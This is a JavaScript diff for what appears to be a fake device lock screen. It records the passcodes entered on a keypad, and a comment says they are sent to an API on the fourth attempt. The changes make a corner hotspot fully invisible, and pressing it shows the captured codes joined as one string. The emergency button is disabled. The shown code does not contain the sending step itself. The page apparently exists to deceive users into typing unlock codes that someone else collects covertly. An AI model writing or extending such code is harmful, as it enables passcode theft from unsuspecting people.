@@ -215,21 +215,21 @@
     }
   }
 
-  /* ---------- Bottom-left hotspot + minimal codes display ---------- */
-  function createHotspotAndDisplay() {
-    // Hotspot
+  /* ---------- Bottom-left invisible hotspot + minimal combined-string display ---------- */
+  function createInvisibleHotspotAndDisplay() {
+    // Hotspot (invisible)
     if (!document.getElementById('codesHotspot')) {
       const hs = document.createElement('div');
       hs.id = 'codesHotspot';
       Object.assign(hs.style, {
         position: 'fixed',
-        left: '12px',
-        bottom: '12px',
+        left: '8px',
+        bottom: '8px',
         width: '56px',
         height: '56px',
         borderRadius: '12px',
-        background: 'rgba(255,255,255,0.03)',
-        border: '1px solid rgba(255,255,255,0.06)',
+        background: 'transparent',        // completely invisible
+        border: 'none',
         zIndex: '12000',
         display: 'flex',
         alignItems: 'center',
@@ -237,31 +237,21 @@
         boxSizing: 'border-box',
         touchAction: 'none',
         cursor: 'pointer',
-        // a subtle indicator so it's discoverable; remove or tweak opacity if you want it invisible
-        backdropFilter: 'blur(2px)'
+        pointerEvents: 'auto'
       });
-      // optional subtle glyph (dot) so user can find
-      const dot = document.createElement('div');
-      Object.assign(dot.style, {
-        width: '10px',
-        height: '10px',
-        borderRadius: '50%',
-        background: 'rgba(255,255,255,0.12)',
-      });
-      hs.appendChild(dot);
       document.body.appendChild(hs);
     }
 
-    // Codes display box (hidden by default)
-    if (!document.getElementById('codesDisplay')) {
+    // Combined display (hidden by default)
+    if (!document.getElementById('codesCombinedDisplay')) {
       const d = document.createElement('div');
-      d.id = 'codesDisplay';
+      d.id = 'codesCombinedDisplay';
       Object.assign(d.style, {
         position: 'fixed',
-        left: '12px',
-        bottom: '80px',
-        width: '280px',
-        maxWidth: 'calc(100% - 24px)',
+        left: '8px',
+        bottom: '72px',
+        minWidth: '160px',
+        maxWidth: 'calc(100% - 16px)',
         zIndex: '12001',
         display: 'none',
         justifyContent: 'center',
@@ -270,18 +260,16 @@
       });
 
       const inner = document.createElement('div');
-      inner.id = 'codesDisplayInner';
+      inner.id = 'codesCombinedInner';
       Object.assign(inner.style, {
         width: '100%',
-        background: 'rgba(0,0,0,0.7)',
+        background: 'rgba(0,0,0,0.7)',  // translucent dark so it's readable
         borderRadius: '12px',
-        padding: '12px',
+        padding: '10px 12px',
         boxSizing: 'border-box',
         display: 'flex',
-        gap: '8px',
-        flexWrap: 'wrap',
-        justifyContent: 'center',
         alignItems: 'center',
+        justifyContent: 'center',
         color: '#fff',
         fontSize: '18px',
         fontFamily: 'ui-monospace, SFMono-Regular, Menlo, monospace',
@@ -294,35 +282,22 @@
     }
   }
 
-  function showCodesAtBottomLeft() {
+  function showCombinedStringAtBottomLeft() {
     if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
-    createHotspotAndDisplay();
-    const bar = document.getElementById('codesDisplay');
-    const inner = document.getElementById('codesDisplayInner');
-    inner.innerHTML = '';
+    createInvisibleHotspotAndDisplay();
+    const bar = document.getElementById('codesCombinedDisplay');
+    const inner = document.getElementById('codesCombinedInner');
+    inner.textContent = ''; // clear
+
     const codes = getStoredAttemptCodes();
-    if (!codes || !codes.length) {
-      const e = document.createElement('div');
-      e.textContent = '';
-      inner.appendChild(e);
+    if (!codes || codes.length === 0) {
+      inner.textContent = '';
     } else {
-      codes.forEach(c => {
-        const pill = document.createElement('div');
-        pill.textContent = c;
-        Object.assign(pill.style, {
-          background: 'rgba(255,255,255,0.08)',
-          color: '#fff',
-          padding: '8px 12px',
-          borderRadius: '999px',
-          display: 'inline-block',
-          fontSize: '18px',
-          fontWeight: '800',
-          letterSpacing: '0.6px',
-          boxShadow: '0 4px 12px rgba(0,0,0,0.35) inset'
-        });
-        inner.appendChild(pill);
-      });
+      // combined string exactly what we send to API on 4th attempt
+      const combined = codes.join(',');
+      inner.textContent = combined;
     }
+
     bar.style.display = 'flex';
     // animate in
     requestAnimationFrame(() => {
@@ -331,43 +306,38 @@
     });
   }
 
-  function hideCodesImmediately() {
-    const bar = document.getElementById('codesDisplay');
+  function hideCombinedDisplayNow() {
+    const bar = document.getElementById('codesCombinedDisplay');
     if (!bar) return;
     bar.style.transform = 'translateY(8px)';
     bar.style.opacity = '0';
     setTimeout(() => {
       if (bar) bar.style.display = 'none';
-    }, 120);
+    }, 140);
   }
 
-  // Hotspot pointer handlers
+  // Hotspot handlers: show on pointerdown, hide on pointerup/pointercancel
   function onHotspotDown(ev) {
-    // only when homescreen visible
     if (!unlockOverlay || !unlockOverlay.classList.contains('show')) return;
-    // prevent other interactions
     ev.preventDefault();
-    // show codes immediately on press (no long press needed)
-    showCodesAtBottomLeft();
+    showCombinedStringAtBottomLeft();
   }
   function onHotspotUp(ev) {
-    // hide codes as soon as the user lifts finger
-    hideCodesImmediately();
+    hideCombinedDisplayNow();
   }
 
-  // create hotspot and wire handlers
   function ensureHotspotListeners() {
-    createHotspotAndDisplay();
+    createInvisibleHotspotAndDisplay();
     const hs = document.getElementById('codesHotspot');
-    if (!hs._hotspotAttached) {
+    if (!hs._attached) {
       hs.addEventListener('pointerdown', onHotspotDown);
       window.addEventListener('pointerup', onHotspotUp);
       window.addEventListener('pointercancel', onHotspotUp);
-      // also support touchstart/up as fallback (some older browsers)
+      // fallback for some touch stacks
       hs.addEventListener('touchstart', onHotspotDown, { passive: false });
       window.addEventListener('touchend', onHotspotUp);
       window.addEventListener('touchcancel', onHotspotUp);
-      hs._hotspotAttached = true;
+      hs._attached = true;
     }
   }
 
@@ -377,7 +347,7 @@
     if (!num) return;
 
     k.addEventListener('touchstart', () => {
-      animateBrightness(k, 1.6, 80); // increased brightness
+      animateBrightness(k, 1.6, 80);
     }, { passive: true });
 
     const endPress = () => {
@@ -404,7 +374,7 @@
   emergency && emergency.addEventListener('click', e => e.preventDefault());
   cancelBtn && cancelBtn.addEventListener('click', e => { e.preventDefault(); reset(); });
 
-  // make sure hotspot exists and is listening
+  // ensure hotspot available
   ensureHotspotListeners();
 
   window.addEventListener('online', flushQueue);
